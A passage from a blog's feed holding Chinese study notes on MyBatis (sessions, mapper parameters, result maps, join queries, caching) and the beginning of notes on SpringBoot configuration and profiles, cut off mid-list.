title="（3）SqlSession"></a>（3）SqlSession</h3><p>SqlSession是用于访问数据库的一个会话。</p><ul><li>SqlSession实例<strong>不是线程安全的</strong>，因此避免被共享，最佳的使用域是请求或非静态方法作用域。</li><li>使用完一个SqlSession后<strong>一定一定一定</strong>要关闭它，为避免关闭资源时异常，最好使用以下方式使用SqlSession</li></ul><pre><code class="java">// 获取SqlSession对象的方法public static SqlSession getSqlSession()&#123;    return sqlSessionFactory.openSession();&#125;// 重载方法，选择是否自动提交public static SqlSession getSqlSession(boolean autoCommit)&#123;    return sqlSessionFactory.openSession(autoCommit);&#125;</code></pre><pre><code class="java">try(SqlSession sqlSession = MybatisUtils.getSqlSession())&#123;    UserDao userDao = sqlSession.getMapper(UserDao.class);    List&lt;User&gt; userList = userDao.getUserList();    for (User user : userList) &#123;        System.out.println(user.toString());    &#125;&#125;</code></pre><h2 id="四、Mapper标签属性注意事项"><a href="#四、Mapper标签属性注意事项" class="headerlink" title="四、Mapper标签属性注意事项"></a>四、Mapper标签属性注意事项</h2><ul><li><code>id</code>：对应接口的方法名</li><li><code>resultType</code>：结果集类型，要写全限定类名，或别名</li><li><code>parameterType</code>：参数类型</li><li>当接口方法只有一个参数时，<code>#&#123;&#125;</code>中有以下几种填法<ul><li>若传入参数类型是一个实体类或其他类，<code>#&#123;&#125;</code>可直接填入相应属性名</li><li>若传入参数类型是<code>Map</code>接口类（可以用别名<code>map</code>代表<code>Map</code>），<code>#&#123;&#125;</code>可直接填入相应的键值</li><li>若传入参数是<code>String</code>、<code>int</code>等其他类型，<code>#&#123;&#125;</code>填任意值数字或字母的组合都行，建议使用<code>param1</code></li></ul></li><li>当接口方法只有多个参数时，<code>parameterType</code>可不填，<code>#&#123;&#125;</code>按接口方法的参数顺序填入<code>#&#123;param1&#125;</code>、<code>#&#123;param2&#125;</code>。或者在接口处使用<code>@param</code>注解，给参数起一个别名。</li></ul><pre><code class="xml">&lt;!-- 有两个类型相同的参数的查询 --&gt;&lt;select id=&quot;getTwoUserById&quot; parameterType=&quot;int&quot; resultType=&quot;org.xxxx.pojo.User&quot;&gt;    select * from user where id = #&#123;param1&#125; or id = #&#123;param2&#125;&lt;/select&gt;&lt;!-- 有两个类型不同的参数的查询2 --&gt;&lt;select id=&quot;getTwoUserById2&quot; parameterType=&quot;Object&quot; resultType=&quot;org.xxxx.pojo.User&quot;&gt;    select * from user where id = #&#123;param1&#125; or name = #&#123;param2&#125;&lt;/select&gt;&lt;!-- 有两个类型不同的参数的查询3 --&gt;&lt;select id=&quot;getTwoUserById3&quot; resultType=&quot;org.xxxx.pojo.User&quot;&gt;    select * from user where id = #&#123;param1&#125; or id = #&#123;param2.id&#125;&lt;/select&gt;&lt;!-- 有两个类型不同的参数的查询4 --&gt;&lt;select id=&quot;getTwoUserById4&quot; resultType=&quot;org.xxxx.pojo.User&quot;&gt;    select * from user where id = #&#123;id&#125; or id = #&#123;user.id&#125;&lt;/select&gt;</code></pre><pre><code class="java">/** * 有两个类型不同的参数的查询4，使用@Param注解 */public List&lt;User&gt; getTwoUserById4(@Param(&quot;id&quot;) int id,@Param(&quot;user&quot;) User user);</code></pre><ul><li>模糊查询有两种方式<ul><li>在mapper中这样用来拼接<code>%</code>：<code>like &quot;%&quot;#&#123;param1&#125;&quot;%&quot;</code></li><li>mapper中仍然使用<code>like #&#123;param1&#125;</code>，而在调用方式时手动在传入参数两边加上<code>%</code></li></ul></li></ul><p>推荐使用第一种，因为在参数里面加<code>%</code>可能面临被转义的风险。</p><pre><code class="xml">&lt;select id=&quot;getUserLike1&quot; parameterType=&quot;string&quot; resultType=&quot;org.xxxx.pojo.User&quot;&gt;    select * from user where name like &quot;%&quot;#&#123;param1&#125;&quot;%&quot;&lt;/select&gt;&lt;select id=&quot;getUserLike2&quot; parameterType=&quot;string&quot; resultType=&quot;org.xxxx.pojo.User&quot;&gt;    select * from user where name like #&#123;param1&#125;&lt;/select&gt;</code></pre><ul><li><code>resultMap</code>：结果集映射，将从数据库中取出来的字段和类中的属性做一个映射关系，为解决数据库字段名和类属性名不一致的问题。<code>column</code>为数据库字段名，<code>property</code>为类的属性名。</li></ul><pre><code class="xml">&lt;resultMap id=&quot;UserMap&quot; type=&quot;user&quot;&gt;    &lt;result column=&quot;id&quot; property=&quot;id&quot;/&gt;    &lt;result column=&quot;name&quot; property=&quot;name&quot;/&gt;    &lt;result column=&quot;password&quot; property=&quot;pwd&quot;/&gt;&lt;/resultMap&gt;</code></pre><h2 id="五、mybatis-config-xml配置解析"><a href="#五、mybatis-config-xml配置解析" class="headerlink" title="五、mybatis-config.xml配置解析"></a>五、mybatis-config.xml配置解析</h2><h3 id="（1）properties标签"><a href="#（1）properties标签" class="headerlink" title="（1）properties标签"></a>（1）properties标签</h3><p>可以引入其他某个<code>.properties</code>文件，作为参数值在本配置文件中使用。</p><pre><code class="xml">&lt;properties resource=&quot;db.properties&quot;/&gt;</code></pre><p>也可以可以加入<code>property</code>标签加入自定义参数。</p><p>对于有重复的参数，参数调用顺序是，先生成<code>property</code>标签中的参数，再读取引入的配置文件中的参数，对于有重复的参数会被覆盖掉，理解成一个<code>HashMap</code>即可。</p><h3 id="（2）settings标签"><a href="#（2）settings标签" class="headerlink" title="（2）settings标签"></a>（2）settings标签</h3><p>有以下属性：<a href="https://mybatis.org/mybatis-3/zh/configuration.html#settings">https://mybatis.org/mybatis-3/zh/configuration.html#settings</a></p><p>主要用的有：</p><ul><li>cacheEnabled：缓存</li><li>useGeneratedKeys：自动生成主键</li><li>mapUnderscoreToCamelCase：数据库字段名转java属性名时自动重命名</li><li>logImpl：日志实现类</li></ul><p>官网也给了一个建议的设置如下：</p><pre><code class="xml">&lt;settings&gt;  &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;  &lt;setting name=&quot;lazyLoadingEnabled&quot; value=&quot;true&quot;/&gt;  &lt;setting name=&quot;multipleResultSetsEnabled&quot; value=&quot;true&quot;/&gt;  &lt;setting name=&quot;useColumnLabel&quot; value=&quot;true&quot;/&gt;  &lt;setting name=&quot;useGeneratedKeys&quot; value=&quot;false&quot;/&gt;  &lt;setting name=&quot;autoMappingBehavior&quot; value=&quot;PARTIAL&quot;/&gt;  &lt;setting name=&quot;autoMappingUnknownColumnBehavior&quot; value=&quot;WARNING&quot;/&gt;  &lt;setting name=&quot;defaultExecutorType&quot; value=&quot;SIMPLE&quot;/&gt;  &lt;setting name=&quot;defaultStatementTimeout&quot; value=&quot;25&quot;/&gt;  &lt;setting name=&quot;defaultFetchSize&quot; value=&quot;100&quot;/&gt;  &lt;setting name=&quot;safeRowBoundsEnabled&quot; value=&quot;false&quot;/&gt;  &lt;setting name=&quot;mapUnderscoreToCamelCase&quot; value=&quot;false&quot;/&gt;  &lt;setting name=&quot;localCacheScope&quot; value=&quot;SESSION&quot;/&gt;  &lt;setting name=&quot;jdbcTypeForNull&quot; value=&quot;OTHER&quot;/&gt;  &lt;setting name=&quot;lazyLoadTriggerMethods&quot; value=&quot;equals,clone,hashCode,toString&quot;/&gt;&lt;/settings&gt;</code></pre><h3 id="（3）typeAliases标签"><a href="#（3）typeAliases标签" class="headerlink" title="（3）typeAliases标签"></a>（3）typeAliases标签</h3><p>为类型设置别名，这样避免了写全限定类型或全限定接口名。</p><p>当为一整个包的类设置别名时，若类型带有<code>@Alias</code>注解时，别名为注解值；否则别名为对应类的类型，首字母小写。</p><pre><code class="xml">&lt;typeAliases&gt;    &lt;!-- &lt;typeAlias type=&quot;org.yuyr757.pojo.User&quot; alias=&quot;UserAlias&quot;/&gt; --&gt;    &lt;package name=&quot;org.xxxxx.pojo&quot;/&gt;&lt;/typeAliases&gt;</code></pre><p>Mybatis有一些默认别名，如下：<a href="https://mybatis.org/mybatis-3/zh/configuration.html#typeAliases">https://mybatis.org/mybatis-3/zh/configuration.html#typeAliases</a></p><h3 id="（4）mappers映射器"><a href="#（4）mappers映射器" class="headerlink" title="（4）mappers映射器"></a>（4）mappers映射器</h3><p>官网有四种写法，使用完全限定资源定位符（URL）不推荐使用。</p><pre><code class="xml">&lt;mappers&gt;    &lt;!-- &lt;mapper resource=&quot;org/xxxx/Dao/UserMapper.xml&quot;/&gt;--&gt;    &lt;!-- &lt;mapper class=&quot;org.xxxx.Dao.UserMapper&quot;/&gt;--&gt;    &lt;package name=&quot;org.xxxx.Dao&quot;/&gt;&lt;/mappers&gt;</code></pre><p>最推荐使用第四种，将包内的映射器接口实现全部注册为映射器。使用条件：</p><ul><li>接口和mapper必须放在同一个包下，建议包名为Dao，<font color="Red">同一个包下是指编译后同一个包下，可以在resources目录下也新建一个<code>org.xxxx.Dao</code>目录，这样接口和mapper配置就会编译到同一个包下了。</font></li><li>接口和mapper两个文件名必须相同（文件类型后缀不管）</li><li>使用这种方式必须在<code>pom.xml</code>中把<code>src/java/main</code>下的xml文件作为配置文件添加到<code>build.resources.resource</code>中</li></ul><pre><code>java.org.xxxx.Dao    UserMapper.java（接口）    Department.javaresources.org.xxxx.Dao    UserMapper.xml（mapper）    Department.xml</code></pre><h2 id="六、分页"><a href="#六、分页" class="headerlink" title="六、分页"></a>六、分页</h2><p>1、在mapper的sql语句中把startIndex和endIndex作为参数传入进去</p><p>2、分页插件PageHelper：<a href="https://pagehelper.github.io/">https://pagehelper.github.io/</a></p><h2 id="七、使用注解开发"><a href="#七、使用注解开发" class="headerlink" title="七、使用注解开发"></a>七、使用注解开发</h2><p>实现方式：反射、动态代理</p><pre><code class="java">/** * 对于这种很简单的sql，可以不用写mapper，直接写一个Select注解，里面传入sql值即可 * 注意点： * 1、数据库字段名和类属性名要相同 * 2、returnType为接口的返回类型 * 3、parameterType为接口的参数类型 */@Select(&quot;select * from user where id = #&#123;param1&#125;&quot;)public List&lt;User&gt; getUserByIdUsingAnnotation(int id);@Select(&quot;select * from user where id = #&#123;param1&#125; or name = #&#123;param2&#125;&quot;)public List&lt;User&gt; getUserByIdUsingAnnotation2(int id, String name);@Insert(&quot;insert into user(id, name, pwd) values (#&#123;id&#125;, #&#123;name&#125;, #&#123;pwd&#125;)&quot;)public void addUserUsingAnnotation(User user);</code></pre><h2 id="八、连表查询1"><a href="#八、连表查询1" class="headerlink" title="八、连表查询1"></a>八、连表查询1</h2><p>在数据库设计时，为降低数据的冗余，一般都会做到三范式。比如学生老师信息表可能会做成以下这种方式：</p><p>比如一个学生表如下：</p><table><thead><tr><th>ID</th><th>NAME</th><th>TEACHER_ID</th></tr></thead><tbody><tr><td>1</td><td>小明</td><td>1</td></tr><tr><td>2</td><td>小五</td><td>1</td></tr><tr><td>3</td><td>小华</td><td>3</td></tr><tr><td>4</td><td>小石</td><td>2</td></tr><tr><td>5</td><td>李笑</td><td>3</td></tr><tr><td>6</td><td>孙武</td><td>2</td></tr><tr><td>7</td><td>黄铭</td><td>2</td></tr></tbody></table><p>一个老师表如下：</p><table><thead><tr><th>ID</th><th>NAME</th></tr></thead><tbody><tr><td>1</td><td>李老师</td></tr><tr><td>2</td><td>黄老师</td></tr><tr><td>3</td><td>钱老师</td></tr></tbody></table><p>因此我们的java对象应该是这样的：</p><pre><code class="java">public class Student &#123;    private int id;    private String name;    private Teacher teacher; // 引用了一个老师&#125;public class Teacher &#123;    private int id;    private String name;&#125;</code></pre><p>这样我们在配置mapper时有两种方法：</p><h3 id="1、通过子查询方式"><a href="#1、通过子查询方式" class="headerlink" title="1、通过子查询方式"></a>1、通过子查询方式</h3><pre><code class="xml">&lt;select id=&quot;getStudent&quot; resultMap=&quot;studentTeacher&quot;&gt;    select * from student&lt;/select&gt;&lt;resultMap id=&quot;studentTeacher&quot; type=&quot;student&quot;&gt;    &lt;result property=&quot;id&quot; column=&quot;id&quot;/&gt;    &lt;result property=&quot;name&quot; column=&quot;name&quot;/&gt;    &lt;!-- 对象使用association，集合使用collection --&gt;    &lt;association property=&quot;teacher&quot; column=&quot;teacher_id&quot; javaType=&quot;teacher&quot; select=&quot;getTeacher&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;getTeacher&quot; resultType=&quot;teacher&quot;&gt;    select * from teacher where id = #&#123;id&#125;&lt;/select&gt;</code></pre><p>其中<code>association</code>标签的属性解释：</p><ul><li><code>property</code>：属性名</li><li><code>column</code>：该属性要用数据库中的某个字段名去关联查询</li><li><code>javaType</code>：该属性的类型</li><li><code>select</code>：从数据库拿到这个类的数据的select语句</li></ul><p>这种方式实际上就是把查询出来的关联字段去重，去重后再去数据库里面查相应的数据，再封装到对象中。</p><p>如打开日志后可以发现这种方式实际上查了四次数据库。</p><pre><code>2021-02-22 17:40:11[ DEBUG ]Opening JDBC Connection2021-02-22 17:40:12[ DEBUG ]Created connection 202125197.2021-02-22 17:40:12[ DEBUG ]==&gt;  Preparing: select * from student 2021-02-22 17:40:12[ DEBUG ]==&gt; Parameters: 2021-02-22 17:40:12[ DEBUG ]====&gt;  Preparing: select * from teacher where id = ? 2021-02-22 17:40:12[ DEBUG ]====&gt; Parameters: 1(Integer)2021-02-22 17:40:12[ DEBUG ]&lt;====      Total: 12021-02-22 17:40:12[ DEBUG ]====&gt;  Preparing: select * from teacher where id = ? 2021-02-22 17:40:12[ DEBUG ]====&gt; Parameters: 3(Integer)2021-02-22 17:40:12[ DEBUG ]&lt;====      Total: 12021-02-22 17:40:12[ DEBUG ]====&gt;  Preparing: select * from teacher where id = ? 2021-02-22 17:40:12[ DEBUG ]====&gt; Parameters: 2(Integer)2021-02-22 17:40:12[ DEBUG ]&lt;====      Total: 12021-02-22 17:40:12[ DEBUG ]&lt;==      Total: 7Student&#123;id=1, name=&#39;小明&#39;, teacher=Teacher&#123;id=1, name=&#39;李老师&#39;&#125;&#125;Student&#123;id=2, name=&#39;小五&#39;, teacher=Teacher&#123;id=1, name=&#39;李老师&#39;&#125;&#125;Student&#123;id=3, name=&#39;小华&#39;, teacher=Teacher&#123;id=3, name=&#39;钱老师&#39;&#125;&#125;Student&#123;id=4, name=&#39;小石&#39;, teacher=Teacher&#123;id=2, name=&#39;黄老师&#39;&#125;&#125;Student&#123;id=5, name=&#39;李笑&#39;, teacher=Teacher&#123;id=3, name=&#39;钱老师&#39;&#125;&#125;Student&#123;id=6, name=&#39;孙武&#39;, teacher=Teacher&#123;id=2, name=&#39;黄老师&#39;&#125;&#125;Student&#123;id=7, name=&#39;黄铭&#39;, teacher=Teacher&#123;id=2, name=&#39;黄老师&#39;&#125;&#125;2021-02-22 17:40:12[ DEBUG ]Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@c0c2f8d]2021-02-22 17:40:12[ DEBUG ]Returned connection 202125197 to pool.</code></pre><h3 id="2、通过连表查询方式"><a href="#2、通过连表查询方式" class="headerlink" title="2、通过连表查询方式"></a>2、通过连表查询方式</h3><pre><code class="xml">&lt;select id=&quot;getStudent2&quot; resultMap=&quot;studentTeacher2&quot;&gt;    select s.id, s.name, s.teacher_id, t.name as teacher_name    from student s left join teacher t on s.teacher_id = t.id&lt;/select&gt;&lt;resultMap id=&quot;studentTeacher2&quot; type=&quot;student&quot;&gt;    &lt;result property=&quot;id&quot; column=&quot;id&quot;/&gt;    &lt;result property=&quot;name&quot; column=&quot;name&quot;/&gt;    &lt;association property=&quot;teacher&quot; javaType=&quot;teacher&quot;&gt;        &lt;result property=&quot;id&quot; column=&quot;teacher_id&quot;/&gt;        &lt;result property=&quot;name&quot; column=&quot;teacher_name&quot;/&gt;    &lt;/association&gt;&lt;/resultMap&gt;</code></pre><p>同样有一个<code>association</code>标签，而下面还有封装这个<code>teacher</code>类的子标签，子标签定义了初始化这个类所需要的字段映射。</p><ul><li><code>property</code>：属性名</li><li><code>javaType</code>：该属性的类型</li></ul><p>这种方式只需要查一次数据库：</p><pre><code>2021-02-22 17:41:58[ DEBUG ]Opening JDBC Connection2021-02-22 17:41:59[ DEBUG ]Created connection 202125197.2021-02-22 17:41:59[ DEBUG ]==&gt;  Preparing: select s.id, s.name, s.teacher_id, t.name as teacher_name from student s left join teacher t on s.teacher_id = t.id 2021-02-22 17:41:59[ DEBUG ]==&gt; Parameters: 2021-02-22 17:41:59[ DEBUG ]&lt;==      Total: 7Student&#123;id=1, name=&#39;小明&#39;, teacher=Teacher&#123;id=1, name=&#39;李老师&#39;&#125;&#125;Student&#123;id=2, name=&#39;小五&#39;, teacher=Teacher&#123;id=1, name=&#39;李老师&#39;&#125;&#125;Student&#123;id=4, name=&#39;小石&#39;, teacher=Teacher&#123;id=2, name=&#39;黄老师&#39;&#125;&#125;Student&#123;id=6, name=&#39;孙武&#39;, teacher=Teacher&#123;id=2, name=&#39;黄老师&#39;&#125;&#125;Student&#123;id=7, name=&#39;黄铭&#39;, teacher=Teacher&#123;id=2, name=&#39;黄老师&#39;&#125;&#125;Student&#123;id=3, name=&#39;小华&#39;, teacher=Teacher&#123;id=3, name=&#39;钱老师&#39;&#125;&#125;Student&#123;id=5, name=&#39;李笑&#39;, teacher=Teacher&#123;id=3, name=&#39;钱老师&#39;&#125;&#125;2021-02-22 17:41:59[ DEBUG ]Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@c0c2f8d]2021-02-22 17:41:59[ DEBUG ]Returned connection 202125197 to pool.</code></pre><p><font color="Red">具体使用哪种方式视情况而定，简单的连表可以使用第二种。当连表查询的sql特别复杂，以致于难以在sql层面去优化时，可以使用第一种，主查询把其他需要连的表的主键查询来，子查询再用主键去查，可能会提高效率。</font></p><h2 id="九、连表查询2"><a href="#九、连表查询2" class="headerlink" title="九、连表查询2"></a>九、连表查询2</h2><p>对于以上的学生老师表，我们的java类还可能是这样的：</p><pre><code class="java">public class Student2 &#123;    private int id;    private String name;    private int teacherId;&#125;public class Teacher2 &#123;    private int id;    private String name;    private List&lt;Student&gt; students; // 老师这里有多个学生对象的引用&#125;</code></pre><p>同样有子查询和连表查询两种方式：</p><h3 id="1、通过子查询方式-1"><a href="#1、通过子查询方式-1" class="headerlink" title="1、通过子查询方式"></a>1、通过子查询方式</h3><pre><code class="xml">&lt;!-- 子查询 --&gt;&lt;select id=&quot;getTeacherById2&quot; resultMap=&quot;teacher2Student2&quot;&gt;    select t.id, t.name from teacher t where t.id = #&#123;id&#125;&lt;/select&gt;&lt;resultMap id=&quot;teacher2Student2&quot; type=&quot;teacher2&quot;&gt;    &lt;result property=&quot;id&quot; column=&quot;id&quot;/&gt;    &lt;result property=&quot;name&quot; column=&quot;name&quot;/&gt;    &lt;collection property=&quot;students&quot; column=&quot;id&quot; javaType=&quot;ArrayList&quot; ofType=&quot;student2&quot; select=&quot;getStudent&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;getStudent&quot; resultMap=&quot;student2Map&quot;&gt;    select * from student where teacher_id = #&#123;id&#125;&lt;/select&gt;&lt;resultMap id=&quot;student2Map&quot; type=&quot;student2&quot;&gt;    &lt;result property=&quot;teacherId&quot; column=&quot;teacher_id&quot;/&gt;&lt;/resultMap&gt;</code></pre><h3 id="2、通过连表查询方式-1"><a href="#2、通过连表查询方式-1" class="headerlink" title="2、通过连表查询方式"></a>2、通过连表查询方式</h3><pre><code class="xml">&lt;!-- 连表查询 --&gt;&lt;select id=&quot;getTeacherById&quot; resultMap=&quot;teacher2Student&quot;&gt;    select t.id, t.name, s.id as student_id, s.name as student_name    from teacher t left join student s on t.id = s.teacher_id    where t.id = #&#123;id&#125;&lt;/select&gt;&lt;resultMap id=&quot;teacher2Student&quot; type=&quot;teacher2&quot;&gt;    &lt;result property=&quot;id&quot; column=&quot;id&quot;/&gt;    &lt;result property=&quot;name&quot; column=&quot;name&quot;/&gt;    &lt;!-- 这里要用ofType，即集合的元素类型 --&gt;    &lt;collection property=&quot;students&quot; ofType=&quot;student2&quot;&gt;        &lt;result property=&quot;id&quot; column=&quot;student_id&quot;/&gt;        &lt;result property=&quot;name&quot; column=&quot;student_name&quot;/&gt;        &lt;result property=&quot;teacherId&quot; column=&quot;id&quot;/&gt;    &lt;/collection&gt;&lt;/resultMap&gt;</code></pre><h2 id="十、缓存"><a href="#十、缓存" class="headerlink" title="十、缓存"></a>十、缓存</h2><h3 id="1、本地缓存。"><a href="#1、本地缓存。" class="headerlink" title="1、本地缓存。"></a>1、本地缓存。</h3><p>作用域为SqlSession，默认开启。</p><p>在一个session中查两次相同的sql，只会执行一次sql，第二次拿到的对象，和第一次拿到的对象的<font color="Red">地址都是一样的。</font><strong>本地缓存将会在做出修改、事务提交或回滚，以及关闭session时清空。默认情况下，本地缓存数据的生命周期等同于整个session的周期。</strong></p><h3 id="2、二级缓存。"><a href="#2、二级缓存。" class="headerlink" title="2、二级缓存。"></a>2、二级缓存。</h3><p>作用域为mapper的namespace，<font color="Red">当sqlsession作出修改、事务提交、回滚或关闭时，会把本地缓存扔到二级缓存中。即一级缓存失效时，会把其缓存的数据扔到二级缓存中。</font></p><p>需要在mapper中加入<code>&lt;cache/&gt;</code>就可以为这个mapper开启二级缓存。</p><pre><code class="xml">&lt;cache       eviction=&quot;FIFO&quot;       flushInterval=&quot;60000&quot;       size=&quot;512&quot;       readOnly=&quot;true&quot;/&gt;</code></pre><p>在<code>mybatis-config.xml</code>配置中，设置<code>cacheEnabled</code>为true可以为所有mapper开启二级缓存。</p><p>缓存清除策略：</p><ul><li><code>LRU</code> – 最近最少使用：移除最长时间不被使用的对象。</li><li><code>FIFO</code> – 先进先出：按对象进入缓存的顺序来移除它们。</li><li><code>SOFT</code> – 软引用：基于垃圾回收器状态和软引用规则移除对象。</li><li><code>WEAK</code> – 弱引用：更积极地基于垃圾收集器状态和弱引用规则移除对象。</li></ul><h3 id="3、缓存顺序"><a href="#3、缓存顺序" class="headerlink" title="3、缓存顺序"></a>3、缓存顺序</h3><p><strong>二级缓存 =&gt; 本地缓存 =&gt; 数据库</strong></p><h2 id="N、注意事项"><a href="#N、注意事项" class="headerlink" title="N、注意事项"></a>N、注意事项</h2><ul><li>insert、update、delete要手动提交事务：</li></ul><pre><code class="java">sqlSession.commit();</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;练习用代码：&lt;a href=&quot;https://github.com/yury757/Mybatis-Study&quot;&gt;yury757/Mybatis-Study (github.com)&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;一、Mybatis问题&quot;&gt;&lt;a href=&quot;#一、Myba</summary>
      
    
    
    
    <category term="java" scheme="https://yury757.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://yury757.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>springboot-study</title>
    <link href="https://yury757.github.io/java/springboot/springboot-study"/>
    <id>https://yury757.github.io/java/springboot/springboot-study</id>
    <published>2021-08-23T16:00:00.000Z</published>
    <updated>2021-08-24T09:06:45.735Z</updated>
    
    <content type="html"><![CDATA[<p><font color="Red">约定大于配置！！</font></p><p>版本：SpringBoot-2.4.3</p><h2 id="一、springboot使用简介"><a href="#一、springboot使用简介" class="headerlink" title="一、springboot使用简介"></a>一、springboot使用简介</h2><h3 id="（1）pom-xml"><a href="#（1）pom-xml" class="headerlink" title="（1）pom.xml"></a>（1）pom.xml</h3><p>pom.xml的依赖都在父工程中<code>spring-boot-dependencies</code>中，我们在引入一些springboot依赖时，可以不需要指定版本，因为父工程中指定了建议的版本。也可以写版本号使用我们自己的版本号。</p><h3 id="（2）启动器"><a href="#（2）启动器" class="headerlink" title="（2）启动器"></a>（2）启动器</h3><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><p>就是一个个功能的开关，我们要使用某个功能，找到相应的启动器<code>starter</code>打开就可以了。如下官网提供了很多启动器：</p><p><a href="https://docs.spring.io/spring-boot/docs/2.4.3/reference/html/using-spring-boot.html#using-boot-starter">https://docs.spring.io/spring-boot/docs/2.4.3/reference/html/using-spring-boot.html#using-boot-starter</a></p><h3 id="（3）启动类"><a href="#（3）启动类" class="headerlink" title="（3）启动类"></a>（3）启动类</h3><p>springboot为我们写了一个默认的启动类，该启动类加了<code>@SpringBootApplication</code>注解，这个注解主要由以下三个注解组成。</p><ul><li>@SpringBootConfiguration：表示这是一个配置类</li><li>@EnableAutoConfiguration：启用自动装配</li><li>@ComponentScan：组件扫描，自动注册bean</li></ul><p>以上三个注解不是必需的，即我们可以挑选使用我们自己需要的功能，或者使用其他注解来启动应用。如下，我们不启用组件扫描，配置了一个属性，还导入了我们自定义的其他配置类。</p><pre><code class="java">package com.example.myapplication;import org.springframework.boot.SpringApplication;import org.springframework.context.annotation.ComponentScanimport org.springframework.context.annotation.Configuration;import org.springframework.context.annotation.Import;@Configuration(proxyBeanMethods = false)@EnableAutoConfiguration@Import(&#123; MyConfig.class, MyAnotherConfig.class &#125;)public class Application &#123;    public static void main(String[] args) &#123;            SpringApplication.run(Application.class, args);    &#125;&#125;</code></pre><h3 id="（4）运行程序"><a href="#（4）运行程序" class="headerlink" title="（4）运行程序"></a>（4）运行程序</h3><pre><code class="shell"># 使用jar包直接运行java -jar target/myapplication-0.0.1-SNAPSHOT.jar# 使用maven运行mvn spring-boot:run</code></pre><h3 id="（5）自动配置"><a href="#（5）自动配置" class="headerlink" title="（5）自动配置"></a>（5）自动配置</h3><p>Spring Boot自动配置会尝试根据您添加的jar依赖项自动配置您的Spring应用程序。 例如，如果HSQLDB位于类路径上，并且尚未手动配置任何数据库连接bean，则Spring Boot会自动配置内存数据库。<font color="Red">springboot支持的自动配置类如下：</font></p><p><a href="https://docs.spring.io/spring-boot/docs/2.4.3/reference/html/appendix-auto-configuration-classes.html">https://docs.spring.io/spring-boot/docs/2.4.3/reference/html/appendix-auto-configuration-classes.html</a></p><p>可以在配置文件中加入以下设置查看哪些自动配置生效了，哪些没生效。</p><pre><code class="yaml">debug: true</code></pre><h3 id="（6）手动配置"><a href="#（6）手动配置" class="headerlink" title="（6）手动配置"></a>（6）手动配置</h3><p>当我们不想用某个依赖的自动配置时，我们可以在我们的启动程序中加上<code>exclude=&#123;DataSourceAutoConfiguration.class&#125;</code>来排除，然后在配置文件中写上我们需要的配置。其实不用排除也可以，springboot中的自动配置有默认值，直接在配置文件中写我们需要的配置，会覆盖默认值。<font color="Red">springboot自动配置的默认值如下：</font></p><p><a href="https://docs.spring.io/spring-boot/docs/2.4.3/reference/html/appendix-application-properties.html">https://docs.spring.io/spring-boot/docs/2.4.3/reference/html/appendix-application-properties.html</a></p><pre><code class="java">import org.springframework.boot.autoconfigure.*;import org.springframework.boot.autoconfigure.jdbc.*;@SpringBootApplication(exclude=&#123;DataSourceAutoConfiguration.class&#125;)public class MyApplication &#123;&#125;</code></pre><p><font color="Red">配置文件中可以写的配置属性从哪里来？（重要！！）</font></p><p>打开下面这个文件</p><pre><code>\org\springframework\boot\spring-boot-autoconfigure\2.4.3\spring-boot-autoconfigure-2.4.3.jar!\META-INF\spring.factories</code></pre><p>都是一个个的xxxAutoConfiguration类，点进去基本都会有以下几个注解：</p><pre><code class="java">// 表明这是一个配置类，即在spring中讲的使用配置类来配置bean@Configuration(proxyBeanMethods = false)// 条件：必须加载了某个类，这个自动配置类才会生效@ConditionalOnClass(KafkaTemplate.class)// 使用某个属性类当作自动配置的属性@EnableConfigurationProperties(KafkaProperties.class)// 点进去上面那个xxxProperties.class，可以发现这里面有很多属性// 且有下面这个注解，这个注解的功能就是将我们的配置文件的属性和这个类中的属性绑定（参考下面的“使用yaml给bean注入属性”）@ConfigurationProperties(prefix = &quot;spring.kafka&quot;)public class KafkaProperties&#123;&#125;</code></pre><p><font color="Red">即xxxAutoConfiguration类就是一个个的配置类，目的是实例化一个个的bean；而xxxProperties类就是属性类，为示例化bean提供属性值，我们在配置文件中可以写的属性就是xxxProperties类中的属性。</font></p><h3 id="（7）配置顺序（重要！！）"><a href="#（7）配置顺序（重要！！）" class="headerlink" title="（7）配置顺序（重要！！）"></a>（7）配置顺序（重要！！）</h3><p>springboot可以从很多地方来配置，官方给了一个配置的覆盖顺序，后面配置会覆盖前面的配置：</p><pre><code>1、Default properties (specified by setting SpringApplication.setDefaultProperties).2、@PropertySource annotations on your @Configuration classes. Please note that such property sources are not added to the Environment until the application context is being refreshed. This is too late to configure certain properties such as logging.* and spring.main.* which are read before refresh begins.3、（主要！）Config data (such as application.properties files)4、A RandomValuePropertySource that has properties only in random.*.5、OS environment variables.6、Java System properties (System.getProperties()).7、JNDI attributes from java:comp/env.8、ServletContext init parameters.9、ServletConfig init parameters.10、Properties from SPRING_APPLICATION_JSON (inline JSON embedded in an environment variable or system property).11、Command line arguments.12、properties attribute on your tests. Available on @SpringBootTest and the test annotations for testing a particular slice of your application.13、@TestPropertySource annotations on your tests.14、Devtools global settings properties in the $HOME/.config/spring-boot directory when devtools is active.</code></pre><p>而第3点配置文件<code>application.yaml</code>可以放置在以下位置，加载顺序也是后面的配置会覆盖前面的配置：</p><pre><code>1、classpath:/2、classpath:/config/3、file:/4、file:/config/</code></pre><p><font color="Red">多环境配置：</font></p><p>可以在文件名后面加对应环境，来设置对应环境的配置，即<code>application-dev.yaml</code>。然后在<code>application.yaml</code>中配置如下设置来修改配置文件：</p><pre><code class="yaml">spring:  profiles:    active: dev</code></pre><p>或者不用新建<code>application-dev.yaml</code>配置文件，而是直接在<code>application.yaml</code>中加入三根英文横线<code>---</code>来分隔文档版本，并且加上对应的环境，也可以进行配置切换。如下使用的就是<code>dev</code>环境。其实建议使用额外增加一个配置文件<code>application-dev.yaml</code>的形式。</p><pre><code class="yaml">server:  port: 8084spring:  profiles:    active: dev---server:  port: 8085spring:  profiles: dev---server:  port: 8086spring:  profiles: test</code></pre><p>对于多环境配置的加载顺序，官网也还有一个顺序，也是后面的配置会覆盖前面的配置，如下：</p><pre><code>1、Application properties 